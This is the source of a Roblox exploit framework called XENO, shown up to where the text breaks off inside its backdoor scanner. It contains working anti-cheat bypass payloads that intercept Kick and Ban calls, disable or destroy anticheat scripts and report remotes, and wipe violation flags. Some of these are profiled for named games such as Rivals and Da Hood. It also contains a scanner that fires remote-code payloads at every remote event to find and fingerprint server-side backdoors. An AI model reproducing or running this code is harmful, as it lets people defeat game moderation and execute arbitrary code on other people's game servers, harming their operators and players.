--- START OF FILE Project.txt ---

--[[
██╗  ██╗███████╗███╗   ██╗ ██████╗ 
╚██╗██╔╝██╔════╝████╗  ██║██╔═══██╗
 ╚███╔╝ █████╗  ██╔██╗ ██║██║   ██║
 ██╔██╗ ██╔══╝  ██║╚██╗██║██║   ██║
██╔╝ ██╗███████╗██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝

XENO | Universal Server-Side Framework v4.2.1
Xeno Executor Compatible Build
]]

-- ═══════════════════════════════════════════════════
--  1 · CONFIGURATION
-- ═══════════════════════════════════════════════════

local CFG = {
    Name           = "XENO",
    Version        = "4.2.1",
    Prefix         = ";",
    ToggleKey      = Enum.KeyCode.RightShift,
    FireDelay      = 0.025,
    FireJitter     = 0.015,
    BatchWait      = 0.55,
    ConcurrentMax  = 2,
    ScanCooldown   = 0.12,
    ToastLife      = 3.5,
    MaxHistory     = 120,
    Window         = {Width = 680, Height = 470},
    Theme = {
        Primary = Color3.fromRGB(140, 50, 235),
        Accent  = Color3.fromRGB(175, 100, 255),
        Glow    = Color3.fromRGB(155, 70, 255),
        BG      = Color3.fromRGB(14, 14, 22),
        Surface = Color3.fromRGB(22, 22, 34),
        Card    = Color3.fromRGB(28, 28, 44),
        Hover   = Color3.fromRGB(36, 36, 56),
        Border  = Color3.fromRGB(50, 50, 72),
        Text    = Color3.fromRGB(210, 218, 245),
        Sub     = Color3.fromRGB(140, 148, 175),
        OK      = Color3.fromRGB(130, 220, 150),
        Err     = Color3.fromRGB(240, 120, 140),
        Warn    = Color3.fromRGB(245, 215, 130),
    },
}

-- ═══════════════════════════════════════════════════
--  2 · SERVICES
-- ═══════════════════════════════════════════════════

local Svc = setmetatable({}, {__index = function(s, k)
    local ok, v = pcall(game.GetService, game, k)
    if ok then rawset(s, k, v) end
    return v
end})

local Players   = Svc.Players
local RS        = Svc.ReplicatedStorage
local Lighting  = Svc.Lighting
local WS        = workspace
local TweenSvc  = Svc.TweenService
local UIS       = Svc.UserInputService
local Http      = Svc.HttpService
local RunSvc    = Svc.RunService
local Debris    = Svc.Debris
local CoreGui   = game:GetService("CoreGui")
local LP        = Players.LocalPlayer

-- ═══════════════════════════════════════════════════
--  3 · UTILITIES (Xeno-safe)
-- ═══════════════════════════════════════════════════

local U = {}

function U.new(class, props, kids)
    local inst = Instance.new(class)
    local parent = nil
    for k, v in pairs(props or {}) do
        if k == "Parent" then parent = v else inst[k] = v end
    end
    for _, child in ipairs(kids or {}) do child.Parent = inst end
    if parent then inst.Parent = parent end
    return inst
end

function U.tween(inst, goal, dur, style, dir)
    local tw = TweenSvc:Create(inst, TweenInfo.new(dur or 0.28, style or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out), goal)
    tw:Play()
    return tw
end

function U.findPlayers(query)
    if not query or query == "" then query = "me" end
    query = query:lower()
    if query == "me" then return {LP} end
    if query == "all" then return Players:GetPlayers() end
    if query == "others" then
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP then t[#t+1] = p end
        end
        return t
    end
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():sub(1, #query) == query or p.DisplayName:lower():sub(1, #query) == query then
            t[#t+1] = p
        end
    end
    return t
end

function U.uid()
    local ok, result = pcall(function()
        return Http:GenerateGUID(false):sub(1, 8)
    end)
    if ok then return result end
    return tostring(math.random(10000000, 99999999))
end

function U.marker()
    return "XV_" .. math.random(100000, 999999)
end

function U.clock()
    return tick()
end

function U.jitterWait(base, jitter)
    local d = base + (math.random() * 2 - 1) * (jitter or 0)
    if d > 0 then task.wait(d) end
end

function U.getGameName()
    local name = "Unknown"
    pcall(function()
        name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    return name
end

-- ═══════════════════════════════════════════════════
--  4 · ANTI-CHEAT BYPASS — SERVER AUTHORITY MODEL
-- ═══════════════════════════════════════════════════

local AC = {
    active      = false,
    mode        = "none",
    results     = {},
    gameProfile = nil,
}

AC.kickPreventCode = [[
pcall(function()
    local hookResult = {kicked = 0, banned = 0}
    local Players = game:GetService("Players")

    local function protectPlayer(plr)
        pcall(function()
            pcall(function()
                local mt = getrawmetatable(plr)
                if mt then
                    local oldNc = mt.__namecall
                    local newHandler = newcclosure(function(self, ...)
                        local method = getnamecallmethod()
                        if (method == "Kick" or method == "Ban" or method == "BanAsync")
                           and typeof(self) == "Instance" and self:IsA("Player") then
                            hookResult.kicked = hookResult.kicked + 1
                            return nil
                        end
                        return oldNc(self, ...)
                    end)
                    setrawmetatable(plr, {__namecall = newHandler})
                end
            end)
        end)
    end

    for _, plr in ipairs(Players:GetPlayers()) do protectPlayer(plr) end
    Players.PlayerAdded:Connect(function(plr) protectPlayer(plr) end)

    pcall(function()
        for _, svc in ipairs({game:GetService("ServerScriptService"), game:GetService("ServerStorage")}) do
            pcall(function()
                for _, obj in ipairs(svc:GetDescendants()) do
                    if obj:IsA("Script") and not obj.Disabled then
                        local n = obj.Name:lower()
                        if n == "kickhandler" or n == "banhandler" or n == "kickscript"
                        or n == "banscript" or n == "autokick" or n == "autoban"
                        or n == "kicksystem" or n == "bansystem" or n == "punishhandler" then
                            obj.Disabled = true
                            hookResult.banned = hookResult.banned + 1
                        end
                    end
                end
            end)
        end
    end)

    pcall(function()
        for _, svc in ipairs({game:GetService("ReplicatedStorage"), game:GetService("ServerStorage")}) do
            pcall(function()
                for _, obj in ipairs(svc:GetDescendants()) do
                    if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")
                    or obj:IsA("BindableEvent") or obj:IsA("BindableFunction") then
                        local n = obj.Name:lower()
                        if n == "kickplayer" or n == "banplayer"
                        or n == "reportexploit" or n == "reportcheat"
                        or n == "flagplayer" or n == "punishplayer" then
                            obj:Destroy()
                            hookResult.banned = hookResult.banned + 1
                        end
                    end
                end
            end)
        end
    end)

    local m = Instance.new("StringValue")
    m.Name = "XENO_KICK_PREVENT"
    m.Value = hookResult.kicked .. "," .. hookResult.banned
    m.Parent = game:GetService("ReplicatedStorage")
    game:GetService("Debris"):AddItem(m, 10)
end)
]]

AC.serverAuthorityCode = [[
pcall(function()
    local result = {spoofed = 0, modules = 0}
    pcall(function()
        for _, svc in ipairs({game:GetService("ServerStorage"), game:GetService("ReplicatedStorage")}) do
            pcall(function()
                for _, obj in ipairs(svc:GetDescendants()) do
                    if obj:IsA("ModuleScript") then
                        local n = obj.Name:lower()
                        if n:find("config") or n:find("setting") or n:find("constant")
                        or n:find("stat") or n:find("weapon") or n:find("balance") then
                            result.modules = result.modules + 1
                        end
                    end
                end
            end)
        end
    end)
    pcall(function()
        for _, plr in ipairs(game.Players:GetPlayers()) do
            pcall(function()
                local char = plr.Character
                if not char then return end
                local hum = char:FindFirstChildWhichIsA("Humanoid")
                if not hum then return end
                for _, attrName in ipairs(hum:GetAttributes()) do
                    pcall(function()
                        if typeof(attrName) == "string" then
                            local low = attrName:lower()
                            if low:find("flag") or low:find("violation")
                            or low:find("warn") or low:find("strike")
                            or low:find("cheat") or low:find("suspect") then
                                hum:SetAttribute(attrName, nil)
                                result.spoofed = result.spoofed + 1
                            end
                        end
                    end)
                end
            end)
        end
    end)
    local m = Instance.new("StringValue")
    m.Name = "XENO_AUTHORITY"
    m.Value = result.spoofed .. "," .. result.modules
    m.Parent = game:GetService("ReplicatedStorage")
    game:GetService("Debris"):AddItem(m, 10)
end)
]]

AC.pipelineNeutralizerCode = [[
pcall(function()
    local result = {events = 0}
    pcall(function()
        for _, svc in ipairs({game:GetService("ServerScriptService"), game:GetService("ServerStorage"), game:GetService("ReplicatedStorage")}) do
            pcall(function()
                for _, obj in ipairs(svc:GetDescendants()) do
                    if obj:IsA("BindableEvent") or obj:IsA("BindableFunction") then
                        local n = obj.Name:lower()
                        if n:find("punish") or n:find("kick") or n:find("ban")
                        or n:find("flag") or n:find("report") or n:find("violation")
                        or n:find("strike") or n:find("penalty") then
                            obj:Destroy()
                            result.events = result.events + 1
                        end
                    end
                end
            end)
        end
    end)
    pcall(function()
        for _, obj in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
            if obj:IsA("RemoteEvent") then
                local n = obj.Name:lower()
                if n:find("report") or n:find("flag") or n:find("violation")
                or n:find("cheatlog") or n:find("detection") then
                    obj:Destroy()
                    result.events = result.events + 1
                end
            end
        end
    end)
    local m = Instance.new("StringValue")
    m.Name = "XENO_PIPELINE"
    m.Value = tostring(result.events)
    m.Parent = game:GetService("ReplicatedStorage")
    game:GetService("Debris"):AddItem(m, 10)
end)
]]

AC.loopProtectCode = [[
pcall(function()
    spawn(function()
        while true do
            wait(5)
            pcall(function()
                for _, plr in ipairs(game.Players:GetPlayers()) do
                    pcall(function()
                        local char = plr.Character
                        if not char then return end
                        local hum = char:FindFirstChildWhichIsA("Humanoid")
                        if not hum then return end
                        for _, attrName in ipairs(hum:GetAttributes()) do
                            pcall(function()
                                if typeof(attrName) == "string" then
                                    local low = attrName:lower()
                                    if low:find("flag") or low:find("violation")
                                    or low:find("warn") or low:find("strike")
                                    or low:find("cheat") or low:find("suspect") then
                                        hum:SetAttribute(attrName, nil)
                                    end
                                end
                            end)
                        end
                        for _, v in ipairs(char:GetDescendants()) do
                            pcall(function()
                                if v:IsA("ValueBase") then
                                    local n = v.Name:lower()
                                    if n:find("violation") or n:find("flag")
                                    or n:find("strike") or n:find("cheat") then
                                        if v:IsA("BoolValue") then v.Value = false
                                        elseif v:IsA("IntValue") or v:IsA("NumberValue") then v.Value = 0 end
                                    end
                                end
                            end)
                        end
                    end)
                end
                for _, svc in ipairs({game:GetService("ServerScriptService"), game:GetService("ServerStorage")}) do
                    pcall(function()
                        for _, obj in ipairs(svc:GetDescendants()) do
                            if (obj:IsA("BindableEvent") or obj:IsA("BindableFunction")) then
                                local n = obj.Name:lower()
                                if n:find("punish") or n:find("kick") or n:find("ban") or n:find("violation") then
                                    obj:Destroy()
                                end
                            end
                        end
                    end)
                end
            end)
        end
    end)
end)
]]

AC.simpleKillCode = [[
pcall(function()
    local killed = 0
    local nameSet = {}
    for _, n in ipairs({"anticheat","antiexploit","anti-cheat","anti-exploit","antihack","gameguard","cheatdetect","exploitdetect","serverguard","serversecurity","speedcheck","flycheck","noclipcheck","teleportcheck","autokick","autoban","automod","kickhandler","banhandler","security","protection","watchdog","sentinel","shield","integrity","cheatprevention"}) do
        nameSet[n] = true
    end
    for _, svc in ipairs({game:GetService("ServerScriptService"), game:GetService("ServerStorage"), game:GetService("Workspace"), game:GetService("ReplicatedStorage")}) do
        pcall(function()
            for _, obj in ipairs(svc:GetDescendants()) do
                if obj:IsA("Script") or obj:IsA("ModuleScript") then
                    if nameSet[obj.Name:lower()] then
                        pcall(function() obj.Disabled = true; obj:Destroy() end)
                        killed = killed + 1
                    end
                end
            end
        end)
    end
    local m = Instance.new("StringValue")
    m.Name = "XENO_SIMPLE_KILL"
    m.Value = tostring(killed)
    m.Parent = game:GetService("ReplicatedStorage")
    game:GetService("Debris"):AddItem(m, 10)
end)
]]

AC.gameProfiles = {
    {name="Rivals", placeIds={17625359962}, desc="FPS w/ server validation", code=[[
pcall(function()
    for _, plr in ipairs(game.Players:GetPlayers()) do pcall(function()
        local char = plr.Character; if not char then return end
        local hum = char:FindFirstChildWhichIsA("Humanoid"); if not hum then return end
        for _, attr in ipairs(hum:GetAttributes()) do pcall(function()
            if typeof(attr) == "string" and (attr:lower():find("speed") or attr:lower():find("flag") or attr:lower():find("violation")) then hum:SetAttribute(attr, nil) end
        end) end
        for _, v in ipairs(char:GetDescendants()) do pcall(function()
            if v:IsA("NumberValue") and (v.Name:lower():find("speed") or v.Name:lower():find("velocity") or v.Name:lower():find("flag")) then end
        end) end
    end) end
    pcall(function() for _, obj in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then local n = obj.Name:lower()
            if n:find("report") or n:find("flag") or n:find("detect") or n:find("violation") or n:find("verify") then end
        end
    end end)
end)]]},
    {name="Arsenal", placeIds={286090429}, desc="FPS damage calc", code=[[
pcall(function()
    for _, plr in ipairs(game.Players:GetPlayers()) do pcall(function()
        local char = plr.Character; if not char then return end
        for _, v in ipairs(char:GetDescendants()) do if v:IsA("ValueBase") then local n = v.Name:lower()
            if n:find("exploit") or n:find("flag") or n:find("violation") then
                if v:IsA("BoolValue") then v.Value = false elseif v:IsA("IntValue") or v:IsA("NumberValue") then v.Value = 0 end
            end
        end end
    end) end
    pcall(function() for _, obj in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("BindableEvent")) and (obj.Name:lower():find("exploit") or obj.Name:lower():find("report")) then obj:Destroy() end
    end end)
end)]]},
    {name="Da Hood", placeIds={2788229376}, desc="Speed/damage AC", code=[[
pcall(function()
    for _, plr in ipairs(game.Players:GetPlayers()) do pcall(function()
        local char = plr.Character; if not char then return end
        for _, v in ipairs(char:GetDescendants()) do if v:IsA("ValueBase") then local n = v.Name:lower()
            if n:find("speed") or n:find("flag") or n:find("exploit") or n:find("violation") then
                if v:IsA("BoolValue") then v.Value = false elseif v:IsA("NumberValue") or v:IsA("IntValue") then v.Value = 0 end
            end
        end end
    end) end
    pcall(function() for _, obj in ipairs(game:GetService("ServerScriptService"):GetDescendants()) do
        if obj:IsA("Script") and (obj.Name:lower():find("anti") or obj.Name:lower():find("exploit")) then obj.Disabled = true end
    end end)
end)]]},
    {name="Blox Fruits", placeIds={2753915549}, desc="Stat validation", code=[[
pcall(function()
    for _, plr in ipairs(game.Players:GetPlayers()) do pcall(function()
        local char = plr.Character; if not char then return end
        for _, v in ipairs(char:GetDescendants()) do if v:IsA("ValueBase") then local n = v.Name:lower()
            if n:find("flag") or n:find("exploit") or n:find("cheat") or n:find("violation") then
                if v:IsA("BoolValue") then v.Value = false elseif v:IsA("IntValue") or v:IsA("NumberValue") then v.Value = 0 end
            end
        end end
    end) end
end)]]},
    {name="MM2", placeIds={142823291}, desc="Speed/TP detection", code=[[
pcall(function()
    for _, plr in ipairs(game.Players:GetPlayers()) do pcall(function()
        local char = plr.Character; if not char then return end
        for _, v in ipairs(char:GetDescendants()) do if v:IsA("ValueBase") then local n = v.Name:lower()
            if n:find("flag") or n:find("exploit") or n:find("speed") or n:find("teleport") then
                if v:IsA("BoolValue") then v.Value = false elseif v:IsA("IntValue") or v:IsA("NumberValue") then v.Value = 0 end
            end
        end end
    end) end
    pcall(function() for _, obj in ipairs(game:GetService("ServerScriptService"):GetDescendants()) do
        if obj:IsA("Script") and obj.Name:lower():find("anti") then obj.Disabled = true end
    end end)
end)]]},
    {name="Generic", placeIds={}, desc="Universal fallback", code=[[
pcall(function()
    for _, plr in ipairs(game.Players:GetPlayers()) do pcall(function()
        local char = plr.Character; if not char then return end
        for _, v in ipairs(char:GetDescendants()) do if v:IsA("ValueBase") then local n = v.Name:lower()
            if n:find("flag") or n:find("violation") or n:find("exploit") or n:find("cheat") or n:find("warn") or n:find("strike") then
                if v:IsA("BoolValue") then v.Value = false
                elseif v:IsA("IntValue") or v:IsA("NumberValue") then v.Value = 0
                elseif v:IsA("StringValue") then v.Value = "" end
            end
        end end
        local hum = char:FindFirstChildWhichIsA("Humanoid")
        if hum then for _, attr in ipairs(hum:GetAttributes()) do pcall(function()
            if typeof(attr) == "string" then local low = attr:lower()
                if low:find("flag") or low:find("violation") or low:find("cheat") or low:find("warn") then hum:SetAttribute(attr, nil) end
            end
        end) end end
    end) end
end)]]},
}

function AC:detectGame()
    local placeId = game.PlaceId
    for _, profile in ipairs(self.gameProfiles) do
        for _, id in ipairs(profile.placeIds) do
            if id == placeId then return profile end
        end
    end
    return self.gameProfiles[#self.gameProfiles]
end

function AC:execute()
    self.results = {}
    local profile = self:detectGame()
    self.gameProfile = profile

    local function runLocal(codeStr)
        local fn, err = loadstring(codeStr)
        if fn then
            local success, res = pcall(fn)
            return success
        end
        return false
    end

    local ok1 = runLocal(self.kickPreventCode)
    task.wait(0.6)
    local r1 = RS:FindFirstChild("XENO_KICK_PREVENT")
    if r1 then self.results.kick = r1.Value; pcall(function() r1:Destroy() end) end

    local ok2 = runLocal(self.serverAuthorityCode)
    task.wait(0.4)
    local r2 = RS:FindFirstChild("XENO_AUTHORITY")
    if r2 then self.results.auth = r2.Value; pcall(function() r2:Destroy() end) end

    local ok3 = runLocal(self.pipelineNeutralizerCode)
    task.wait(0.4)
    local r3 = RS:FindFirstChild("XENO_PIPELINE")
    if r3 then self.results.pipe = r3.Value; pcall(function() r3:Destroy() end) end

    local ok4 = runLocal(profile.code)
    task.wait(0.4)

    local ok5 = runLocal(self.simpleKillCode)
    task.wait(0.4)
    local r5 = RS:FindFirstChild("XENO_SIMPLE_KILL")
    if r5 then self.results.killed = r5.Value; pcall(function() r5:Destroy() end) end

    local ok6 = runLocal(self.loopProtectCode)

    self.active = true
    self.mode = "authority_local"
    local lc = 0
    for _, v in ipairs({ok1, ok2, ok3, ok4, ok5, ok6}) do
        if v then lc = lc + 1 end
    end
    return true, {profile = profile.name, layersOk = lc, layers = {ok1,ok2,ok3,ok4,ok5,ok6}, results = self.results}
end

function AC:syncAfterChange()
    local fn = loadstring([[
pcall(function()
    for _, plr in ipairs(game.Players:GetPlayers()) do pcall(function()
        local char = plr.Character; if not char then return end
        local hum = char:FindFirstChildWhichIsA("Humanoid"); if not hum then return end
        for _, attr in ipairs(hum:GetAttributes()) do pcall(function()
            if typeof(attr) == "string" then local low = attr:lower()
                if low:find("flag") or low:find("violation") or low:find("warn") or low:find("strike") or low:find("cheat") then hum:SetAttribute(attr, nil) end
            end
        end) end
        for _, v in ipairs(char:GetDescendants()) do pcall(function()
            if v:IsA("ValueBase") then local n = v.Name:lower()
                if n:find("flag") or n:find("violation") or n:find("strike") then
                    if v:IsA("BoolValue") then v.Value = false
                    elseif v:IsA("IntValue") or v:IsA("NumberValue") then v.Value = 0 end
                end
            end
        end) end
    end) end
end)]])
    if fn then return pcall(fn) end
    return false
end

-- ═══════════════════════════════════════════════════
--  5 · BACKDOOR ENGINE
-- ═══════════════════════════════════════════════════

local BD = {
    active     = nil,
    scanning   = false,
    confirmed  = {},
    tested     = {},
    scanStats  = {remotesScanned = 0, timeElapsed = 0, patternsTotal = 0},
}

BD.exactNames = {
    "Backdoor","backdoor","BACKDOOR","Execute","execute","EXECUTE",
    "MainEvent","mainEvent","mainevent","ServerEvent","serverevent",
    "Handler","handler","Bridge","bridge",
    "Hydrogen","HydrogenEvent","H_Event","HydrogenRemote","H_RE",
    "Crusher","CrusherEvent","SC_Event","ServerCrusher",
    "AztupEvent","Aztup","AztupRemote",
    "NihonEvent","Nihon","NH_Event",
    "JEBIEvent","JEBI","JebiRemote",
    "NexusEvent","Nexus","NX_Event",
    "DansEvent","Dansploit","DAN_RE",
    "OwlEvent","OwlRemote","OWL_SS",
    "IYEvent","IY_SS","InfYield",
    "BDEvent","BD_Exec","BDRemote",
    "LalolEvent","Lalol","LALOL","lalol",
    "LalolRemote","LH_Event","LH_RE","LalolHub","lalolhub",
    "LalolExec","Lalol_Event","LaLol","LaLolEvent",
    "e","r","f","x","a","b","c","d",
    "E","R","F","X","A","B","C","D",
    "re","ev","fe","rf","xe","rx","RE","EV","FE","RF",
    "lol","abc","xyz","hi","ok","gg","LOL","ABC","XYZ",
    "aaa","bbb","eee","rrr",
    "Event","RemoteEvent","Remote","Fire","fire","Run","run",
    "Comm","comm","Network","network","Gate","gate","Relay","relay",
    "Hook","hook","Main","main","Load","load","Source","source",
    "Exec","exec","Code","code","ServerRemote","ClientToServer",
    "Signal","signal","Tunnel","tunnel","Pipe","pipe",
    "Link","link","Socket","socket","Channel","channel",
    "1","2","3","69","420","1337","666",
    ""," ",".",
}

BD.namePatterns = {
    "backdoor","backd00r","execut","loadstr","loadstring",
    "server.*event","remote.*event","hydrogen","crusher","aztup",
    "nihon","jebi","nexus","dansploit","owl.*hub","owl.*ss",
    "lalol","la_lol","lh_","ss.*event","ss.*remote",
    "serversid","server_side","admin.*event","admin.*remote",
    "exploit","hack","cheat","inject","payload",
    "cmd","command","require.*event","free.*model",
}

BD.patterns = {
    {name="Raw String",fn=function(r,c) r:FireServer(c) end},
    {name="Table {Code=}",fn=function(r,c) r:FireServer({Code=c}) end},
    {name="Table {code=}",fn=function(r,c) r:FireServer({code=c}) end},
    {name="Table {Source=}",fn=function(r,c) r:FireServer({Source=c}) end},
    {name="Table {source=}",fn=function(r,c) r:FireServer({source=c}) end},
    {name="Table {Src=}",fn=function(r,c) r:FireServer({Src=c}) end},
    {name="Table {cmd=}",fn=function(r,c) r:FireServer({cmd=c}) end},
    {name='"execute",code',fn=function(r,c) r:FireServer("execute",c) end},
    {name='"run",code',fn=function(r,c) r:FireServer("run",c) end},
    {name='"exec",code',fn=function(r,c) r:FireServer("exec",c) end},
    {name='"load",code',fn=function(r,c) r:FireServer("load",c) end},
    {name='"loadstring",c',fn=function(r,c) r:FireServer("loadstring",c) end},
    {name='"code",code',fn=function(r,c) r:FireServer("code",c) end},
    {name='"cmd",code',fn=function(r,c) r:FireServer("cmd",c) end},
    {name='"",code',fn=function(r,c) r:FireServer("",c) end},
    {name="nil,code",fn=function(r,c) r:FireServer(nil,c) end},
    {name="Table {[1]=code}",fn=function(r,c) r:FireServer({c}) end},
    {name='{code,"execute"}',fn=function(r,c) r:FireServer({c,"execute"}) end},
    {name='"admin",code',fn=function(r,c) r:FireServer("admin",c) end},
    {name='"owner",code',fn=function(r,c) r:FireServer("owner",c) end},
    {name='"pass",code',fn=function(r,c) r:FireServer("pass",c) end},
    {name='"key",code',fn=function(r,c) r:FireServer("key",c) end},
    {name='"debug",code',fn=function(r,c) r:FireServer("debug",c) end},
    {name="true,code",fn=function(r,c) r:FireServer(true,c) end},
    {name="false,code",fn=function(r,c) r:FireServer(false,c) end},
    {name="Player,code",fn=function(r,c) r:FireServer(Players.LocalPlayer,c) end},
    {name="UserId,code",fn=function(r,c) r:FireServer(Players.LocalPlayer.UserId,c) end},
    {name='"ss","exec",code',fn=function(r,c) r:FireServer("ss","execute",c) end},
    {name='"server",code',fn=function(r,c) r:FireServer("server",c) end},
    {name="1,code",fn=function(r,c) r:FireServer(1,c) end},
    {name="0,code",fn=function(r,c) r:FireServer(0,c) end},
    {name="69,code",fn=function(r,c) r:FireServer(69,c) end},
    {name="420,code",fn=function(r,c) r:FireServer(420,c) end},
    {name='"lalol",code',fn=function(r,c) r:FireServer("lalol",c) end},
    {name='{Type="lalol",Code=}',fn=function(r,c) r:FireServer({Type="lalol",Code=c}) end},
}

BD.rfPatterns = {
    {name="Raw String",fn=function(r,c) return r:InvokeServer(c) end},
    {name="Table {Code=}",fn=function(r,c) return r:InvokeServer({Code=c}) end},
    {name="Table {code=}",fn=function(r,c) return r:InvokeServer({code=c}) end},
    {name="Table {Source=}",fn=function(r,c) return r:InvokeServer({Source=c}) end},
    {name='"execute",code',fn=function(r,c) return r:InvokeServer("execute",c) end},
    {name='"",code',fn=function(r,c) return r:InvokeServer("",c) end},
    {name="nil,code",fn=function(r,c) return r:InvokeServer(nil,c) end},
    {name="Table {[1]=code}",fn=function(r,c) return r:InvokeServer({c}) end},
    {name="true,code",fn=function(r,c) return r:InvokeServer(true,c) end},
    {name="Player,code",fn=function(r,c) return r:InvokeServer(Players.LocalPlayer,c) end},
    {name='"lalol",code',fn=function(r,c) return r:InvokeServer("lalol",c) end},
}

BD.fingerprints = {
    {name="Hydrogen SS",check=function(r,p) local n=r.Name:lower(); return n:find("hydrogen") or n:find("h_") or (p=="Table {Code=}" and r:IsDescendantOf(RS)) end},
    {name="ServerCrusher",check=function(r,p) local n=r.Name:lower(); return n:find("crush") or n:find("sc_") or ((p=='"",code' or p=="nil,code") and #r.Name<=3) end},
    {name="Aztup Hub",check=function(r,p) local n=r.Name:lower(); return n:find("aztup") or (p=='"execute",code' and n:find("event")) end},
    {name="Nihon SS",check=function(r,p) local n=r.Name:lower(); return n:find("nihon") or n:find("nh_") or p=="Table {[1]=code}" end},
    {name="JEBI SS",check=function(r,p) local n=r.Name:lower(); return n:find("jebi") or p=="Player,code" or p=="UserId,code" end},
    {name="Nexus SS",check=function(r,p) return r.Name:lower():find("nexus") or r.Name:lower():find("nx_") end},
    {name="Dansploit",check=function(r,p) local n=r.Name:lower(); return n:find("dans") or p=='"ss","exec",code' end},
    {name="Owl Hub SS",check=function(r,p) return r.Name:lower():find("owl") end},
    {name="IY SS",check=function(r,p) local n=r.Name:lower(); return n:find("iy") or n:find("infyield") end},
    {name="Backdoor.exe",check=function(r,p) local n=r.Name:lower(); return n:find("bd_") or n:find("bdexec") end},
    {name="Lalol Hub",check=function(r,p) local n=r.Name:lower(); return n:find("lalol") or n:find("lh_") or (p and p:find("lalol")) end},
    {name="Password",check=function(r,p) return p and (p:find('"admin"') or p:find('"owner"') or p:find('"pass"') or p:find('"key"')) end},
    {name="Classic FM",check=function(r,p) return p=="Raw String" and (#r.Name<=3 or r.Name:lower():find("event")) end},
    {name="Obfuscated",check=function(r,p) local n=r.Name; return (n:match("^%x+$") and #n>=6) or #n>20 end},
}

function BD:fingerprint(remote, patternName)
    for _, fp in ipairs(self.fingerprints) do
        local ok, result = pcall(fp.check, remote, patternName)
        if ok and result then return fp.name end
    end
    return "Unknown"
end

function BD:gatherRemotes()
    local p1,p2,p3,p4 = {},{},{},{}
    local exactSet = {}
    for _,n in ipairs(self.exactNames) do exactSet[n]=true end
    local containers,added = {},{}
    local function tryAdd(s) pcall(function() local sv=game:GetService(s); if sv and not added[sv] then containers[#containers+1]=sv; added[sv]=true end end) end
    for _,s in ipairs({"ReplicatedStorage","Workspace","Lighting","StarterGui","StarterPlayer","StarterPack","ReplicatedFirst","Chat","SoundService","Teams"}) do tryAdd(s) end
    pcall(function() for _,c in ipairs(game:GetChildren()) do if not added[c] then pcall(function() c:GetDescendants(); containers[#containers+1]=c; added[c]=true end) end end end)
    for _,root in ipairs(containers) do
        pcall(function()
            for _,obj in ipairs(root:GetDescendants()) do
                if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not self.tested[obj] then
                    if exactSet[obj.Name] then
                        p1[#p1+1]=obj
                    else
                        local m=false
                        local l=obj.Name:lower()
                        for _,pat in ipairs(self.namePatterns) do
                            if l:find(pat) then p2[#p2+1]=obj; m=true; break end
                        end
                        if not m then
                            if #obj.Name<=3 then p3[#p3+1]=obj else p4[#p4+1]=obj end
                        end
                    end
                end
            end
        end)
    end
    local r={}
    for _,t in ipairs({p1,p2,p3,p4}) do for _,v in ipairs(t) do r[#r+1]=v end end
    return r,#p1,#p2,#p3,#p4
end

function BD:validateThrottled(remote)
    local pats = remote:IsA("RemoteFunction") and self.rfPatterns or self.patterns
    local markers = {}
    for idx,pat in ipairs(pats) do
        local tag = U.marker().."_"..idx
        markers[idx]=tag
        local tc = string.format('pcall(function() local v=Instance.new("StringValue");v.Name="%s";v.Value="ok";v.Parent=game:GetService("ReplicatedStorage");game:GetService("Debris"):AddItem(v,12) end)',tag)
        if remote:IsA("RemoteFunction") then
            task.spawn(function() pcall(function() pat.fn(remote,tc) end) end)
        else
            pcall(function() pat.fn(remote,tc) end)
        end
        U.jitterWait(CFG.FireDelay, CFG.FireJitter)
    end
    task.wait(CFG.BatchWait)
    for idx,tag in ipairs(markers) do
        local found=RS:FindFirstChild(tag)
        if found then
            pcall(function() found:Destroy() end)
            for _,t in ipairs(markers) do
                local leftover=RS:FindFirstChild(t)
                if leftover then pcall(function() leftover:Destroy() end) end
            end
            return true, idx, pats[idx].name
        end
    end
    for _,tag in ipairs(markers) do
        local leftover=RS:FindFirstChild(tag)
        if leftover then pcall(function() leftover:Destroy() end) end
    end
    self.tested[remote]=true
    return false,nil,nil
end

function BD:validate(remote) return self:validateThrottled(remote) end

function BD:scan(statusCallback, quickMode)
    if self.scanning then return self.confirmed end
    self.scanning=true
    self.confirmed={}
    local startTime=U.clock()

    if statusCallback then statusCallback("gathering",0) end

    local remotes,np1,np2,np3,np4 = self:gatherRemotes()
    if quickMode then
        local q={}
        for i=1,np1+np2 do
            if remotes[i] then q[#q+1]=remotes[i] end
        end
        remotes=q
    end

    local totalRemotes=#remotes
    local modeStr=quickMode and "QUICK" or "DEEP"

    if statusCallback then
        statusCallback("gathered",totalRemotes,0,nil,{exact=np1,pattern=np2,short=np3,other=np4,mode=modeStr})
    end

    local scannedCount=0
    local i=1

    while i<=totalRemotes do
        local batch={}
        for j=1,CFG.ConcurrentMax do
            local idx=i+j-1
            if idx<=totalRemotes and not self.tested[remotes[idx]] then
                batch[#batch+1]={remote=remotes[idx],index=idx}
            end
        end

        if #batch > 0 then
            for _,item in ipairs(batch) do
                if statusCallback then
                    local elapsed=U.clock()-startTime
                    statusCallback("validating",totalRemotes,scannedCount,item.remote.Name,{
                        elapsed=elapsed,
                        confirmed=#self.confirmed,
                        perSecond=scannedCount/math.max(elapsed,0.01),
                    })
                end

                local valid,patIdx,patName = self:validateThrottled(item.remote)
                if valid then
                    local fp=self:fingerprint(item.remote,patName)
                    local entry={
                        inst=item.remote, name=item.remote.Name,
                        path=item.remote:GetFullName(), type=item.remote.ClassName,
                        patternIdx=patIdx, patternName=patName, fingerprint=fp,
                    }
                    self.confirmed[#self.confirmed+1]=entry
                    if statusCallback then
                        statusCallback("found",totalRemotes,scannedCount,item.remote.Name,entry)
                    end
                end

                self.tested[item.remote]=true
                scannedCount=scannedCount+1
                U.jitterWait(CFG.ScanCooldown,0.05)
            end
        end

        i=i+CFG.ConcurrentMax
    end

    local totalTime=U.clock()-startTime
    self.scanStats={
        remotesScanned=scannedCount,
        timeElapsed=totalTime,
